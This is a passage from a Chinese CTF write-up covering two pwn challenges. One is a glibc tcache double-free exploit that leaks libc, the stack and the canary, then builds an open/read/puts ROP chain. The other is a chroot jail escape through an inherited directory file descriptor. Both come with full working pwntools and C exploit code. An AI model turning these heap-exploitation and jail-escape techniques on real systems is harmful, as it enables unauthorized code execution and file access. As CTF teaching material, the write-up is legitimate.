虽然execve被禁用了，但是open，read，puts都是可以使用的，只需要在栈上构造一条rop链来利用。

那么既需要泄露libc_base，又需要泄露栈。

最终利用思路如下：

1. 填满0xa0的tcache，然后泄露出unsorted_bin的地址从而算出libc_base，environ，之前提到的函数，以及pop_rdi，pop_rsi，pop_rdx三个gadget来为函数传参。
2. 利用double free分配一个堆块到bss上存放chunk size的地方（利用某个size作为堆块的size域），并往下填充，把第一个堆块指针覆盖为environ。利用读功能泄露出栈地址后，结合动态调试得到的偏移，算出一开始输入内容的栈地址以便后续利用。
3. 由于要构造rop，泄露canary必不可少，那么之前第一个输入就可以用来构造fakechunk，double free分配chunk到该位置，填充到canary最后一位然后利用读功能就可以泄露canary了。
4. 那么要在什么地方构造rop chain，由于tcache机制是在太宽松，所以double free分配出来的堆块几乎可以是任意大小，于是只要在某个函数的返回地址构造rop chain就可以执行rop来输出flag了。main函数不太可行，因为有一个死循环不让它返回，于是可以试试控制new函数的返回。动态调试找到new后面某个位置（其实按理来说有tcache不用关心构造fakesize，但是为了防止这类题被出在libc2.23我还是按照这个思路走一走），构造rop chain+“flag\x00”
5. 最后随便new一个块，就可以收到flag了



#### exp: 

```python
from pwn import *

#p = remote("pwn.challenge.mini.lctf.online",10085)
p = process("./pwn")
elf = ELF("./pwn")
libc = ELF("libc.so.6")

context.log_level = "debug"

def new(size:int,content):
    p.recvuntil(b">> ")
    p.sendline(b"1")
    p.recvuntil(b"size?\n")
    p.sendline(str(size).encode())
    p.recvuntil(b"content?\n")
    p.send(content)
    
def delete(idx:int):
    p.recvuntil(b">> ")
    p.sendline(b"2")
    p.recvuntil(b"index ?\n")
    p.sendline(str(idx).encode())    
    
def write(idx:int):
    p.recvuntil(b">> ")
    p.sendline(b"3")
    p.recvuntil(b"index ?\n")
    p.sendline(str(idx).encode()) 

note_addr = 0x6020C0
notesize6_addr = 0x602058



def exp():
    pop_rdi = 0x2155f
    pop_rsi = 0x23e6a
    pop_rdx = 0x1b96
    #start at 0x7fffffffdb60
    #end at 0x7fffffffdc60
    #fakechunk at 0x7fffffffdc48
    #leave a blank(8bytes) to fix fastbin after fastbin_attack
    name = b"a"*0xE8 + p64(0) + p64(0x81) # padding + fakechunk
    p.recvuntil(b"what is your name? \n")
    p.sendline(name)
    #gdb.attach(p)
    #leak lib
    new(0x80,b"aaaaaaaa") # idx0
    new(0x80,b"aaaaaaaa") # idx1
    new(0x10,b"aaaaaaaa") # idx2
    for i in range(7):
        delete(0)
    delete(1)
    #gdb.attach(p)
    write(1)
    unsorted_arena = u64(p.recvuntil(b"\x0a",drop=True).ljust(8,b"\x00"))
    libc_base = unsorted_arena - 0x3ebca0
    environ = libc_base + 0x3ee098
    print("unsorted_arena:",hex(unsorted_arena))
    print("libc_base:",hex(libc_base))
    print("environ:",hex(environ)) # stack addr here
    
    #gadgets&rop funcs
    pop_rdi = libc_base + pop_rdi
    pop_rsi = libc_base + pop_rsi
    pop_rdx = libc_base + pop_rdx
    openat_addr = libc_base + libc.symbols[b"openat"]
    open_addr = libc_base + libc.symbols[b"open"]
    read_addr = libc_base + libc.symbols[b"read"]
    puts_addr = libc_base + libc.symbols[b"puts"]
    
    #double free& leak_stack
    new(0x78,b"split unsorted bin") #get unsorted bin idx3
    new(0x78,b"bbbbbbbb") #idx4
    delete(4)
    delete(4)
    fake_bss_chunk_addr = notesize6_addr+0x8 #user_size_start
    new(0x78,p64(fake_bss_chunk_addr)) #idx5
    new(0x78,b"bbbbbbbb") #idx6
    payload = b"a"*0x60 + p64(environ)
    new(0x78,payload) #idx7
    write(0)
    #gdb.attach(p)
    stack_leak = u64(p.recvuntil(b"\x0a",drop=True).ljust(8,b"\x00")) #0x7fffffffdd68
    fake_stack_chunk = stack_leak - 0x120
    print("stack_leak",hex(stack_leak))
    print("fake_stack_chunk",hex(fake_stack_chunk))
    
    #get stack_fake_chunk_1 & leak canary
    new(0x78,b"cccccccc") #idx8
    new(0x78,b"cccccccc") #idx9
    delete(8)
    delete(9)
    delete(8)
    #p.recv()
    new(0x78,p64(fake_stack_chunk)) #idx10
    new(0x78,b"cccccccc") #idx11
    new(0x78,b"cccccccc") #idx12
    new(0x78,b"a"*0x11) #idx13
    write(13)
    p.recv(0x11)
    canary = u64(p.recv(7).rjust(8,b"\x00")) #xxx....00
    print("canary:",hex(canary))
    #gdb.attach(p)
    
    #get stack_fake_chunk_2 & start rop
    fake_stack_chunk2 = stack_leak - 0x246

    flag_addr = fake_stack_chunk2 + 0x10 + 0x6 + 0x10 + 0x78
    rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr) #0x28
    rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr+8) + p64(pop_rdx) + p64(0x30) + p64(read_addr) #0x38
    rop += p64(pop_rdi) + p64(flag_addr+8) + p64(puts_addr) #0x18
    rop += b'flag\x00'

    print("fake_stack_chunk2:",hex(fake_stack_chunk2))
    new(0x300,b"eeeeeeee") #idx14
    delete(14)
    delete(14)
    new(0x300,p64(fake_stack_chunk2+0x10)) #idx15
    new(0x300,b"eeeeeeee") #idx16
    payload = b"a"*0x6 + p64(canary) + p64(0) + rop
    new(0x300,payload)
    
    p.interactive()
if __name__ == "__main__":
    exp()
```

比赛赶时间，exp写得比较乱，但是这是我认为最值得复现的一道题。



### jail | Author: eqqie

#### 分析

题目原题是awd，看着比较复杂，其实不然，exp利用原理也很 简单，关键就是熟练使用搜索引擎查找知识点。

这是个chroot jail越狱题，不同于普通的root身份越狱那么简单，需要找到一个已经打开的文件标识符，刚开始想破脑子也没想到在啥位置。后来查到fork之后子进程会和父进程共享文件描述符（本来是个简单的知识点，奈何我有一段时间没看书了嘤嘤嘤）。

梳理下过程：主进程fork出一个子进程然后用一个管道监听子进程返回的信息，子进程用execveat系统调用执行我们传入的二进制文件，但是此时的工作目录已经被切换到了/tmp/jail，切用户等级非root。

只需要写一个二进制文件利用已有的文件描述符切换工作目录到jail之外，然后切换到根目录，读取flag就行了。

观察发现程序的init函数中打开过 **/tmp** 和 **/** 两个目录的文件描述符，并且没有被关闭，继承到了子进程中。那么他们的文件描述符应分别为3和4....我其实想到这个思路挺早的，但是一直写的是fchdir(3)没成功...后来绕了一大圈改成了fchdir(4)突然就成功了，差点吐血。

后来koo师傅告诉我/tmp无法继承，因为fcntl禁止了，我才似懂非懂咋回事...



#### exp-python部分：

```python
from pwn import *
context.log_level = 'debug'

io = remote("pwn.challenge.mini.lctf.online",10009)

def runbin(lenth, data, arg):
    io.sendlineafter('len?\n', str(lenth))
    io.sendlineafter('data?\n', data)
    io.sendlineafter('elf?\n', arg)

if __name__ == '__main__':
    f = open('./exploit', 'rb')
    payload = f.read()
    runbin(len(payload)+1, payload, '')
    io.interactive()
    io.close()
```

#### exp-C部分：

```c
#include <unistd.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <dirent.h>
#include <stdlib.h>
//gcc -o exploit ./exploit.c -masm=intel -no-pie -static

void show_dir(const char *path){
    DIR *dirp; 
    struct dirent *dp;
    dirp = opendir(path); 
    while ((dp = readdir(dirp)) != NULL) { 
        printf("%s\n", dp->d_name );
    }      
    (void) closedir(dirp); 
}

void catflag(char * flag)
{
    FILE * f = fopen(flag, "r");
    char buf[60] = {0};
    fread(buf, 1, 60, f);
    fclose(f);
    write(1,buf,60);
    return;
}

int main(int argc, const char **argv, const char **envp)
{
    setvbuf(stdout,0,2,0);
    fchdir(4);
    chdir("../../../../../../../");
    show_dir(".");
	catflag("flag");
    return 0;
}
```





